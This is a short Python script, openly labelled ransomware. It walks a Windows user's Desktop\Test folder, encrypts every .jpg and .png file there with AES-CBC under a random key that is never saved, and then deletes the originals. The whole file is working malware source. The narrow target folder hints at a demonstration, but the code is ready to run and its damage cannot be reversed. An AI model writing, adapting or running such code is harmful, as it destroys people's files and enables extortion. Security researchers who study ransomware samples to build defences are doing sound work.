#!/usr/bin/env python
#! -*- coding: UTF-8 -*-
import os, sys, ctypes, struct, random
from getpass import *
from Crypto.Cipher import AES

password = ""
user_win = getuser()
extensions = ('.jpg','jpeg','.png')
paths=['C:\\Users\\'+user_win+'\\Desktop\\Test']

def generate_key(genkey, size=16):
    chars = "QAZWSXEDCRFVTGBYHNUJMIKOLP"
    genkey = ''.join(random.choice(chars) for _ in range(size))
    return genkey
key=generate_key(password)

def ransomware_encrypt(key, in_filename, out_filename=None, chunksize=65535):
    if not out_filename:
        out_filename = in_filename + '.yourextension'
    iv = ''.join((chr(random.randint(0, 255)) for i in range(16)))
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    filesize = os.path.getsize(in_filename)

    with open(in_filename, 'rb') as ifile:
        with open(out_filename, 'wb') as ofile:
            ofile.write(struct.pack('<Q', filesize))
            ofile.write(iv)
            while True:
                chunk = ifile.read(chunksize)
                if(len(chunk)==0):
                    break
                elif(len(chunk)%16!=0):
                    chunk += ' '*(16-len(chunk)%16)
                ofile.write(encryptor.encrypt(chunk))

def ransomware_file_encrypt():
    for path in paths:
        for root,dirs,files in os.walk(path):
            for file in files:
                if(file.endswith(extensions)):
                    ransomware_encrypt(key, os.path.join(root, file))
                    os.remove(os.path.join(root, file))
ransomware_file_encrypt()